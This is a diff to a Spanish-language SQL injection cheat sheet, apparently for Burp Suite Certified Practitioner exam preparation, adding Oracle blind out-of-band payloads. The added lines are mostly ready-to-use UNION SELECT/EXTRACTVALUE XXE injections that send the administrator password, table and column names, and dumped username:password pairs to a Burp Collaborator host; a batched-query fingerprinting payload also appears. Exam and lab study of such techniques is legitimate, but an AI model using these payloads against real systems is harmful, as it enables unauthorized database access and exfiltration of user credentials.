@@ -2,7 +2,26 @@ PortSwigger cheat sheet:
 https://portswigger.net/web-security/sql-injection/cheat-sheet
 
 --------
+# ⚠️⚠️⚠️ Si no lo pilla el SQLMap, probar casi seguro un Blind OOB
 
+###### Comando Final:
+```sql
+' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.ID_COLLABORATOR.oastify.com/"> %25remote%3b]>'),'/l') FROM dual-- -
+```
+###### Enumerar tablas:
+```sql
+' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http://'||(SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM (SELECT table_name FROM all_tables WHERE ROWNUM <= 10))||'.ID_COLLABORATOR.oastify.com/"> %25remote%3b]>'),'/l') FROM dual-- -
+```
+###### Enumerar Columnas:
+```sql
+' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http://'||(SELECT LISTAGG(column_name,',') WITHIN GROUP (ORDER BY column_name) FROM all_tab_columns WHERE table_name='USERS_ABCDEF')||'.ID_COLLABORATOR.oastify.com/"> %25remote%3b]>'),'/l') FROM dual-- -
+```
+###### Loot Data:
+```sql
+' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http://'||(SELECT LISTAGG(USERNAME_XYZ||':'||PASSWORD_XYZ,',') WITHIN GROUP (ORDER BY USERNAME_XYZ) FROM USERS_ABCDEF)||'.ID_COLLABORATOR.oastify.com/"> %25remote%3b]>'),'/l') FROM dual-- -
+```
+
+---
 # SQL Injection — (BSCP)
 
 ## 1. Contar columnas
@@ -63,9 +82,9 @@ Lanza uno a uno contra el punto de inyección. En cuanto uno dé respuesta "true
 
 **Batched queries**
 
-|Payload|Resultado esperado|
-|---|---|
-|`';SELECT 1-- -`|Sin error → MSSQL o PostgreSQL. Error → Oracle (no soporta) o MySQL (normalmente bloqueado)|
+| Payload          | Resultado esperado                                                                          |
+| ---------------- | ------------------------------------------------------------------------------------------- |
+| `';SELECT 1-- -` | Sin error → MSSQL o PostgreSQL. Error → Oracle (no soporta) o MySQL (normalmente bloqueado) |
 
 ---
 
